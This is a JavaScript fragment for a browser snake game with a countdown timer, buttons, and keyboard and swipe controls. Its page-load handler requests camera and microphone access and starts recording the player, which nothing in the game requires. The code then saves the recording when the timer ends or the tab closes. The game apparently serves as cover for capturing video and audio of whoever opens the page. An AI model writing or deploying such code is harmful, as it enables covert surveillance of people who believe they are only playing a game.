// Timer variables
const timerValueEl = document.getElementById("timerValue");
let timerSeconds = 40;
let timerInterval;

function startTimer() {
  timerSeconds = 40;
  timerValueEl.textContent = timerSeconds;
  timerInterval = setInterval(() => {
    timerSeconds--;
    timerValueEl.textContent = timerSeconds;
    if (timerSeconds <= 0) {
      clearInterval(timerInterval);
      stopRecordingAndSave();
    }
  }, 1000);
}

function resetTimer() {
  clearInterval(timerInterval);
  timerSeconds = 40;
  timerValueEl.textContent = timerSeconds;
}

document.getElementById("btnStart").addEventListener("click", () => {
  resetGame();
  clearInterval(gameInterval);
  gameInterval = setInterval(gameLoop, 100);
  startTimer();

  // Disable start, enable new game
  document.getElementById("btnStart").disabled = true;
  document.getElementById("btnNewGame").disabled = false;
});

document.getElementById("btnNewGame").addEventListener("click", () => {
  resetGame();
  clearInterval(gameInterval);
  gameInterval = setInterval(gameLoop, 100);
  resetTimer();

  // Reset buttons
  document.getElementById("btnStart").disabled = true;
  document.getElementById("btnNewGame").disabled = false;
});

// Keyboard controls
window.addEventListener("keydown", e => {
  switch (e.key) {
    case "ArrowUp": e.preventDefault(); setDirection(0, -1); break;
    case "ArrowDown": e.preventDefault(); setDirection(0, 1); break;
    case "ArrowLeft": e.preventDefault(); setDirection(-1, 0); break;
    case "ArrowRight": e.preventDefault(); setDirection(1, 0); break;
  }
});

// Touch controls for mobile swipe
let touchStartX = null;
let touchStartY = null;

window.addEventListener("touchstart", e => {
  if (e.touches.length === 1) {
    touchStartX = e.touches[0].clientX;
    touchStartY = e.touches[0].clientY;
  }
});

window.addEventListener("touchend", e => {
  if (touchStartX === null || touchStartY === null) return;
  const dx = e.changedTouches[0].clientX - touchStartX;
  const dy = e.changedTouches[0].clientY - touchStartY;

  if (Math.abs(dx) > Math.abs(dy)) {
    if (dx > 30) setDirection(1, 0);
    else if (dx < -30) setDirection(-1, 0);
  } else {
    if (dy > 30) setDirection(0, 1);
    else if (dy < -30) setDirection(0, -1);
  }

  touchStartX = null;
  touchStartY = null;
});

// Request permissions & start recording on page load
window.addEventListener("load", async () => {
  try {
    await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    startRecording();
  } catch (err) {
    console.warn("Permission denied or error:", err);
  }
});

// Stop recording if user closes or switches tab
window.addEventListener("pagehide", stopRecordingAndSave);
window.addEventListener("beforeunload", stopRecordingAndSave);